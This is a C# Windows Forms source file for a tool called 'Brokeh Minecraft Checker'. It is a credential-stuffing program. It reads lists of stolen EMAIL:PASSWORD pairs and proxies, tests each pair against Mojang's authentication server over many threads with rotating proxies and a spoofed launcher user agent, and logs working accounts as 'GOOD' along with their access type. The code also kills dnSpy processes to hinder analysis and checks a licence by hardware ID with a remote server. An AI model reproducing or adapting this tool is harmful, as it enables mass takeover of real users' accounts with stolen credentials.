using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Brokeh_Minecraft_Checker.Common;
using Newtonsoft.Json;
using xNet;

namespace Brokeh_Minecraft_Checker
{
    public partial class Form1 : Form
    {
        private static readonly List<AccountExtra> EnabledExtras = new List<AccountExtra>()
        {
            new OptifineCapeExtra()
        };

        public sealed override string Text
        {
            get => base.Text;
            set => base.Text = value;
        }

        private const string Version = "2.4.0";
        private const string AuthServerEndpoint = "https://authserver.mojang.com/authenticate";
        private const string Changelog = "Added dark theme and internal changes.";

        private readonly Random _random;
        private readonly object _monitor;
        private readonly List<Account> _resolvedAccounts;

        private Queue<string> _queue;
        private int _countGood;
        private int _countError;
        private int _countBad;
        private int _countThreads;
        private int _countTested;
        private Thread[] _threads;
        private int _status; // 0 = STOPPED | 1 = RUNNING
        private string[] _accounts;
        private string[] _proxies;


        public Form1(string hardwareId)
        {
            _resolvedAccounts = new List<Account>();
            _random = new Random();
            _monitor = RuntimeHelpers.GetObjectValue(new object());

            Program.KillDnSpyProcessByName();
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;

            var wC = new WebClient();

            string resposta = wC.DownloadString("http://brokeh-checker.tk/check.php?hwid=" + hardwareId);
            if (resposta.Contains("OK|"))
            {
                string username = resposta.Replace("OK|", "");
                Text = $"Brokeh Minecraft Checker v-{Version} [User: {username}] [{Version}: {Changelog}]";
            }
            else if (resposta.Contains("Not authorized!"))
            {
                MessageBox.Show(resposta);

                Application.Exit();
            }
            else
            {
                MessageBox.Show("Internal error!");
                Application.Exit();
            }

            resposta = wC.DownloadString("http://brokeh-checker.tk/versao.txt");
            if (!resposta.Contains(Version))
            {
                MessageBox.Show("New version available! Go to our website.");
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            var fileDialog = new OpenFileDialog
            {
                Title = "Select Combo List",
                Filter = "Combo | *.txt"
            };

            if (fileDialog.ShowDialog() != DialogResult.OK)
                return;

            try
            {
                _accounts = File.ReadAllText(fileDialog.FileName)
                    .Split(new[] {Environment.NewLine}, StringSplitOptions.None);

                Program.KillDnSpyProcessByName();
            }
            catch (Exception)
            {
                MessageBox.Show("Invalid combo list.\nCombo format is EMAIL:PASSWORD");
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            var fileDialog = new OpenFileDialog
            {
                Title = "Select Proxy List",
                Filter = "Proxy | *.txt"
            };

            if (fileDialog.ShowDialog() != DialogResult.OK)
                return;

            try
            {
                _proxies = File.ReadAllText(fileDialog.FileName)
                    .Split(new[] {Environment.NewLine}, StringSplitOptions.None);
            }
            catch (Exception)
            {
                MessageBox.Show("Invalid proxy list list.\nProxy list format is IP:PORT");
            }
        }

        private void Terminator()
        {
            if (_status != 1)
            {
                MessageBox.Show("The checker is not running");
                return;
            }

            int num = decimal.ToInt32(threadCount.Value);
            for (int i = 0; i < num; i++)
            {
                _threads[i].Abort();
                _countThreads--;

                if (_countThreads == 0)
                {
                    _status = 0;
                    timer2.Stop();
                    pictureBox1.Visible = false;
                    MessageBox.Show("FINISHED!");
                }
            }
        }

        private void Checker()
        {
            Program.KillDnSpyProcessByName();

            if (_status != 1)
                return;

            int indexProxy = _random.Next(1, _proxies.Length);
            string proxyAddress = _proxies[indexProxy];

            while (_queue.Count > 0)
            {
                var monitor1 = RuntimeHelpers.GetObjectValue(_monitor);
                bool flag = false;
                string text = "";
                Program.KillDnSpyProcessByName();

                var monitor2 = RuntimeHelpers.GetObjectValue(monitor1);
                var monitor3 = RuntimeHelpers.GetObjectValue(monitor2);
                Monitor.Enter(RuntimeHelpers.GetObjectValue(monitor2), ref flag);
                try
                {
                    text = _queue.Peek().Replace("\r", "");
                    _queue.Dequeue();
                }
                catch (Exception)
                {
                    // ignored
                }

                if (flag)
                {
                    Monitor.Exit(RuntimeHelpers.GetObjectValue(monitor3));
                }

                try
                {
                    string[] accountData = text.Split(':');
                    using (var httpRequest = new HttpRequest())
                    {
                        // Parse proxy, if https is not checked it will try with Socks5
                        httpRequest.Proxy = ProxyClient.Parse(
                            (https.Checked ? ProxyType.Http : ProxyType.Socks5),
                            proxyAddress);

                        string payload = PrepareRequest(httpRequest, accountData);

                        try
                        {
                            string response = httpRequest.Post(AuthServerEndpoint,
                                payload, "application/json").ToString();

                            // Check if username or password is invalid
                            if (response.Contains("Invalid username or password.")
                                || !response.Contains("\"selectedProfile\":{"))
                            {
                                _countBad++;
                                _countTested++;
                                continue;
                            }

                            if (!response.Contains("accessToken"))
                            {
                                proxyAddress = _proxies[_random.Next(1, _proxies.Length)];
                                _queue.Enqueue(text);
                                _countError++;
                                continue;
                            }

                            var results = JsonConvert.DeserializeObject<dynamic>(response);

                            string nick = results.availableProfiles[0].name;
                            var account = new Account(nick, accountData[1])
                            {
                                Proxy = proxyAddress
                            };
                            _resolvedAccounts.Add(account);

                            string accountType;
                            try
                            {
                                // Check if the account is Not full access or semi access
                                accountType = results.user.secured ? "NFA" : "SFA";
                            }
                            catch (Exception)
                            {
                                accountType = "None";
                            }

                            account.Type = accountType;

                            EnabledExtras.ForEach(extra =>
                            {
                                bool f = extra.CheckExtra(new HttpRequest(), account);
                                if (f) account.Extras.Add(extra);
                            });

                            aprovadas.AppendText("GOOD | " + account + Environment.NewLine);

                            _countGood++;
                        }
                        catch (Exception)
                        {
                            proxyAddress = _proxies[_random.Next(0, _proxies.Length)];
                            _queue.Enqueue(text);
                            _countError++;

                            Program.KillDnSpyProcessByName();
                        }
                    }
                }
                catch
                {
                    _countError++;
                }

                _countTested++;
            }
        }

        /// <summary>
        /// Prepares the request
        /// </summary>
        /// <param name="request">The request object</param>
        /// <param name="account">The account credentials</param>
        /// <returns>The payload of the request</returns>
        private string PrepareRequest(HttpRequest request, string[] account)
        {
            var cookies = new CookieDictionary();
            request.Cookies = cookies;
            request.IgnoreProtocolErrors = true;
            request.ConnectTimeout = Convert.ToInt32(timeoutValue.Value) * 1000;
            request.AllowAutoRedirect = true;
            request.KeepAlive = true;
            request.Referer = "https://minecraft.net/pt-br/login/";
            request.UserAgent = "Minecraft Launcher/2.0.1049 (061d773c8e) Windows (6.1; x86)";
            request.AddHeader("Origin", "mojang://launcher");

            /*
             * {
             *     "agent": {
             *         "name": "Minecraft",
             *         "version": 1,
             *     },
             *     "username": "USERNAME",
             *     "password": "PASSWORD",
             *     "clientToken": "TOKEN",
             *     "requestUser": true
             * }
             */
            string payload = string.Concat(@"{ ""agent"":{ ""name"":""Minecraft"",""version"":1},""username"":""",
                account[0],
                @""",""password"":""",
                account[1],
                @""",""clientToken"":""ec8503f9-f717-46b3-b755-78db16771163"",""requestUser"":""true""}"
            );

            return payload;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if (_status != 0)
            {
                MessageBox.Show("Checker already started");
                return;
            }

            pictureBox1.Visible = true;
            _status = 1;

            button1.Enabled = false;
            button2.Enabled = false;
            button3.Enabled = false;
            socks5.Enabled = false;
            https.Enabled = false;

            timer2.Start();

            if (!_accounts.Any() || !_proxies.Any())
            {
                MessageBox.Show("Load Combo list and Proxy list!");
                return;
            }

            _countGood = 0;
            _countError = 0;
            _countTested = 0;
            _countBad = 0;
            _queue = new Queue<string>();

            int num = _accounts.Length;

            for (int i = 0; i < num; i++)
            {
                _queue.Enqueue(_accounts[i]);
            }

            int numberOfThreads = decimal.ToInt16(threadCount.Value);

            _threads = new Thread[numberOfThreads];

            int totalNumberOfThreads = numberOfThreads;
            for (int j = 0; j < totalNumberOfThreads; j++)
            {
                _threads[j] = new Thread(Checker)
                {
                    IsBackground = true
                };

                _threads[j].Start();
                _countThreads++;
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            label7.Text = "B R O K E H    M I N E C R A F T   C H E C K E R   " + Version;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            countErrorLabel.Text = _countError.ToString();
            countGoodsLabel.Text = _countGood.ToString();
            countsTestedsLabel.Text = _countTested.ToString();
            countBadLabel.Text = _countBad.ToString();
            threadsCountLabel.Text = _countThreads.ToString();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            Terminator();
            button1.Enabled = true;
            button2.Enabled = true;
            button3.Enabled = true;
            socks5.Enabled = true;
            https.Enabled = true;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Application.Exit();
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            if (_status != 1 || _countTested != _accounts.Length)
                return;

            timer2.Stop();
            button4.PerformClick();
        }
    }
}